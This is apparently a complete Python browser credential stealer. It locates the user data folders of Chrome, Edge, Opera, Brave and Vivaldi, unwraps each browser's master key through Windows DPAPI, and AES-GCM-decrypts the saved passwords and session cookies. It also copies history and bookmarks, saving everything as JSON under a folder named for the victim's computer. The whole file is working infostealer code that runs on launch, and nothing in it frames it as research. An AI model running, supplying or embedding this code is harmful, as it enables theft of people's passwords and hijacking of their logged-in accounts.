import os
import json
import base64
import sqlite3
import shutil
import getpass
import tempfile
from Crypto.Cipher import AES
import win32crypt
import datetime

# Dictionary containing paths to user data for different browsers
browser_data_paths = {
    "chrome": os.path.join(
        os.environ['SYSTEMDRIVE'] + '\\Users',
        getpass.getuser(),
        "AppData", "Local", "Google", "Chrome", "User Data"
    ),
    "edge": os.path.join(
        os.environ['SYSTEMDRIVE'] + '\\Users',
        getpass.getuser(),
        "AppData", "Local", "Microsoft", "Edge", "User Data"
    ),
    "opera": os.path.join(
        os.environ['SYSTEMDRIVE'] + '\\Users',
        getpass.getuser(),
        "AppData", "Roaming", "Opera Software", "Opera Stable"
    ),
    "brave": os.path.join(
        os.environ['SYSTEMDRIVE'] + '\\Users',
        getpass.getuser(),
        "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"
    ),
    "vivaldi": os.path.join(
        os.environ['SYSTEMDRIVE'] + '\\Users',
        getpass.getuser(),
        "AppData", "Local", "Vivaldi", "User Data"
    )
}

def save_to_file(browser_name, filename, data):
    COMPUTER_NAME = os.environ['COMPUTERNAME']
    folder_path = os.path.join("dumps", COMPUTER_NAME, browser_name)

    # Create the folder if it doesn't exist
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    # Save the data to file
    file_path = os.path.join(folder_path, filename)
    with open(file_path, 'w') as f:
        f.write(json.dumps(data, indent=4))

def copy_db_file(src_path):
    temp_dir = tempfile.gettempdir()
    file_name = os.path.basename(src_path)
    dest_path = os.path.join(temp_dir, file_name)
    shutil.copy2(src_path, dest_path)
    return dest_path

def extract_encrypted_key(browser_data_path):
    local_state_path = os.path.join(browser_data_path, "Local State")

    with open(local_state_path, 'r') as file:
        local_state = file.read()
        local_state = json.loads(local_state)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI
    return encrypted_key

def decrypt_passwords(browser_name, browser_data_path):
    encrypted_key = extract_encrypted_key(browser_data_path)
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    chrome_path_login_db = os.path.join(browser_data_path, "Default", "Login Data")
    login_db_temp_path = copy_db_file(chrome_path_login_db)

    conn = sqlite3.connect(login_db_temp_path)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    
    decrypted_logins = []

    for index, login in enumerate(cursor.fetchall()):
        url = login[0]
        username = login[1]
        ciphertext = login[2]

        if len(ciphertext) > 16:
            nonce = ciphertext[3:15]
            ciphertext = ciphertext[15:]

            if len(ciphertext) > 16:
                cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=nonce)
                try:
                    decrypted_pass = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:]).decode('utf-8')
                    decrypted_logins.append({
                        "Url": url,
                        "Username": username,
                        "Password": decrypted_pass,
                    })
                except Exception as e:
                    print("An error occurred:", str(e))

    save_to_file(browser_name, 'passwords.json', decrypted_logins)

    conn.close()
    os.remove(login_db_temp_path)

def decrypt_cookies(browser_name, browser_data_path):
    encrypted_key = extract_encrypted_key(browser_data_path)
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    chrome_path_cookie_db = os.path.join(browser_data_path, "Default", "Network", "Cookies")
    cookie_db_temp_path = copy_db_file(chrome_path_cookie_db)

    conn = sqlite3.connect(cookie_db_temp_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")

    decrypted_cookies = []

    for index, cookie in enumerate(cursor.fetchall()):
        host = cookie[0]
        name = cookie[1]
        path = cookie[2]
        ciphertext = cookie[3]
        expires = cookie[4]
        expires = datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds=expires) - datetime.timedelta(microseconds=11644473600000000)

        if len(ciphertext) > 16:
            nonce = ciphertext[3:15]
            ciphertext = ciphertext[15:]

            if len(ciphertext) > 16:
                cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=nonce)
                try:
                    decrypted_value = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:]).decode('utf-8')
                    decrypted_cookies.append({
                        "Host": host,
                        "Name": name,
                        "Path": path,
                        "Value": decrypted_value,
                        "Expires": expires.isoformat(),
                    })
                except Exception as e:
                    print("An error occurred:", str(e))

    save_to_file(browser_name, 'cookies.json', decrypted_cookies)

    conn.close()
    os.remove(cookie_db_temp_path)

def extract_history(browser_name, browser_data_path):
    chrome_path_history_db = os.path.join(browser_data_path, "Default", "History")
    history_db_temp_path = copy_db_file(chrome_path_history_db)

    conn = sqlite3.connect(history_db_temp_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")

    history = []

    for index, record in enumerate(cursor.fetchall()):
        url = record[0]
        title = record[1]
        visit_count = record[2]
        last_visit_time = record[3]
        last_visit_time = datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds=last_visit_time) - datetime.timedelta(microseconds=11644473600000000)

        history.append({
            "Url": url,
            "Title": title,
            "Visit Count": visit_count,
            "Last Visit Time": last_visit_time.isoformat(),
        })
    
    save_to_file(browser_name, 'history.json', history)

    conn.close()
    os.remove(history_db_temp_path)

def extract_bookmarks(browser_name, browser_data_path):
    chrome_path_bookmarks = os.path.join(browser_data_path, "Default", "Bookmarks")

    with open(chrome_path_bookmarks, 'r', encoding='utf-8') as file:
        bookmarks = json.load(file)

    # If 'sync_metadata' key is present, remove it
    if 'sync_metadata' in bookmarks:
        del bookmarks['sync_metadata']

    save_to_file(browser_name, 'bookmarks.json', bookmarks)

for browser_name, browser_data_path in browser_data_paths.items():
    if os.path.exists(browser_data_path):
        print(f"Extracting data from {browser_name.capitalize()}...")
        decrypt_passwords(browser_name, browser_data_path)
        decrypt_cookies(browser_name, browser_data_path)
        extract_history(browser_name, browser_data_path)
        extract_bookmarks(browser_name, browser_data_path)
    else:
        print(f"{browser_name.capitalize()} is not installed or the path is incorrect.")
